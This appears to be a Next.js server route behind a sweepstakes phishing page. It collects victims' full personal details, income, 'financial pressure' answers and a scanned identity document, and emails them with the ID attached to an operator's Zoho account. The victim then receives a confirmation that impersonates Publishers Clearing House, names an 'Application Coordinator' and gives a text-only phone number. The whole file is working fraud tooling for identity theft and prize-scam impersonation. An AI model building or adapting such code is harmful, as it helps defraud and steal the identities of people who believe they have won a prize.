import { NextRequest, NextResponse } from 'next/server';
import nodemailer from 'nodemailer';
import { escapeHtml } from '@/lib/utils';

interface ProfilePayload {
  appRef: string;
  prizeCategory: string;
  appDate: string;
  fullName: string;
  dob: string;
  email: string;
  phone: string;
  addressStreet: string;
  addressCity: string;
  addressRegion: string;
  postalCode: string;
  addressCountry: string;
  maritalStatus: string;
  dependents: string;
  employment: string;
  monthlyIncome: string;
  financialPressure: string;
  megaPrizePlan: string;
  acceptLowerTier: string;
  infoConfirm: boolean;
  idFileName: string;
  idMimeType: string;
  idData: string;
}

const MAX_ID_BYTES = 8 * 1024 * 1024;
const ALLOWED_ID_TYPES = new Set([
  'image/jpeg',
  'image/png',
  'image/webp',
  'image/gif',
  'application/pdf',
]);

function str(v: unknown): string {
  return typeof v === 'string' ? v.trim() : '';
}

function validate(body: unknown): ProfilePayload | null {
  if (!body || typeof body !== 'object') return null;
  const o = body as Record<string, unknown>;

  const payload: ProfilePayload = {
    appRef: str(o.appRef),
    prizeCategory: str(o.prizeCategory),
    appDate: str(o.appDate),
    fullName: str(o.fullName),
    dob: str(o.dob),
    email: str(o.email),
    phone: str(o.phone),
    addressStreet: str(o.addressStreet),
    addressCity: str(o.addressCity),
    addressRegion: str(o.addressRegion),
    postalCode: str(o.postalCode),
    addressCountry: str(o.addressCountry),
    maritalStatus: str(o.maritalStatus),
    dependents: str(o.dependents),
    employment: str(o.employment),
    monthlyIncome: str(o.monthlyIncome),
    financialPressure: str(o.financialPressure),
    megaPrizePlan: str(o.megaPrizePlan),
    acceptLowerTier: str(o.acceptLowerTier),
    infoConfirm: o.infoConfirm === true,
    idFileName: str(o.idFileName),
    idMimeType: str(o.idMimeType),
    idData: typeof o.idData === 'string' ? o.idData.replace(/\s/g, '') : '',
  };

  const required = [
    payload.appRef,
    payload.prizeCategory,
    payload.appDate,
    payload.fullName,
    payload.dob,
    payload.email,
    payload.phone,
    payload.addressStreet,
    payload.addressCity,
    payload.addressRegion,
    payload.postalCode,
    payload.addressCountry,
    payload.maritalStatus,
    payload.dependents,
    payload.employment,
    payload.monthlyIncome,
    payload.financialPressure,
    payload.megaPrizePlan,
    payload.acceptLowerTier,
  ];

  if (
    required.some((v) => !v) ||
    !payload.infoConfirm ||
    !payload.idFileName ||
    !payload.idMimeType ||
    !payload.idData
  ) {
    return null;
  }

  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(payload.email)) {
    return null;
  }

  if (!ALLOWED_ID_TYPES.has(payload.idMimeType)) {
    return null;
  }

  let idBuffer: Buffer;
  try {
    idBuffer = Buffer.from(payload.idData, 'base64');
  } catch {
    return null;
  }

  if (!idBuffer.length || idBuffer.length > MAX_ID_BYTES) {
    return null;
  }

  return payload;
}

function row(label: string, value: string) {
  return `<tr><td style="padding:6px 12px 6px 0;font-weight:600;vertical-align:top;color:#555;">${escapeHtml(label)}</td><td style="padding:6px 0;">${escapeHtml(value)}</td></tr>`;
}

export async function POST(request: NextRequest) {
  const parsed = validate(await request.json());
  if (!parsed) {
    return NextResponse.json(
      {
        error:
          'Please complete every field, upload a valid ID (JPG, PNG, or PDF, max 8 MB), and confirm the information is accurate.',
      },
      { status: 400 }
    );
  }

  const zohoUser = process.env.ZOHO_USER;
  const zohoPass = process.env.ZOHO_PASS;
  const toEmail = process.env.TO_EMAIL || zohoUser;

  if (!zohoUser || !zohoPass) {
    console.error('ZOHO_USER or ZOHO_PASS not configured');
    return NextResponse.json(
      { error: 'Submission is temporarily unavailable. Please try again later or email support@applypch.com.' },
      { status: 500 }
    );
  }

  const transporter = nodemailer.createTransport({
    host: 'smtp.zoho.com',
    port: 465,
    secure: true,
    auth: { user: zohoUser, pass: zohoPass },
  });

  const address = `${parsed.addressStreet}, ${parsed.addressCity}, ${parsed.addressRegion} ${parsed.postalCode}, ${parsed.addressCountry}`;

  const html = `
    <h2>Application Profile — Submitted Online</h2>
    <table style="border-collapse:collapse;font-size:14px;line-height:1.5;">
      ${row('Reference', parsed.appRef)}
      ${row('Prize category', parsed.prizeCategory)}
      ${row('Application date', parsed.appDate)}
      ${row('Full name', parsed.fullName)}
      ${row('Date of birth', parsed.dob)}
      ${row('Email', parsed.email)}
      ${row('Phone', parsed.phone)}
      ${row('Address', address)}
      ${row('Marital status', parsed.maritalStatus)}
      ${row('Dependents', parsed.dependents)}
      ${row('Employment', parsed.employment)}
      ${row('Monthly income', parsed.monthlyIncome)}
      ${row('Financial pressure', parsed.financialPressure)}
      ${row('Mega prize plan', parsed.megaPrizePlan)}
      ${row('Accept lower tier', parsed.acceptLowerTier)}
      ${row('ID document', `${parsed.idFileName} (attached)`)}
    </table>
    <p style="margin-top:16px;color:#666;font-size:12px;">Submitted via applypch.com/documents/application-profile.html</p>
  `;

  const idBuffer = Buffer.from(parsed.idData, 'base64');

  const text = [
    `Application profile — ${parsed.appRef}`,
    `Name: ${parsed.fullName}`,
    `Email: ${parsed.email}`,
    `Phone: ${parsed.phone}`,
    `DOB: ${parsed.dob}`,
    `Address: ${address}`,
    `Employment: ${parsed.employment}`,
    `Income: ${parsed.monthlyIncome}`,
    `ID document: ${parsed.idFileName} (attached)`,
  ].join('\n');

  try {
    await transporter.sendMail({
      from: zohoUser,
      to: toEmail || zohoUser,
      replyTo: parsed.email,
      subject: `[PCH Application Profile] ${parsed.fullName} — ${parsed.appRef}`,
      text,
      html,
      attachments: [
        {
          filename: parsed.idFileName,
          content: idBuffer,
          contentType: parsed.idMimeType,
        },
      ],
    });

    await transporter.sendMail({
      from: zohoUser,
      to: parsed.email,
      subject: `Application profile received — ${parsed.appRef}`,
      html: `
        <p>Dear ${escapeHtml(parsed.fullName)},</p>
        <p>We have received your complete application and verification profile for reference <strong>${escapeHtml(parsed.appRef)}</strong>, including your identity document.</p>
        <p>Your submission is being processed for <strong>final review</strong> in the current Publishers Clearing House prize drawing.</p>
        <p>Dave Sayer, your PCH Application Coordinator, will contact you on your official text or email thread with the next update.</p>
        <p>Publishers Clearing House<br>support@applypch.com<br>+1 (917) 743-0256 (text only)</p>
      `,
      text: `We have received your application profile for ${parsed.appRef}. It is being processed for final review. Dave Sayer will contact you with the next update.`,
    });

    return NextResponse.json({ ok: true });
  } catch (err) {
    console.error('Application profile submit error:', err);
    return NextResponse.json(
      { error: 'Could not submit your profile. Please try again or email support@applypch.com.' },
      { status: 500 }
    );
  }
}
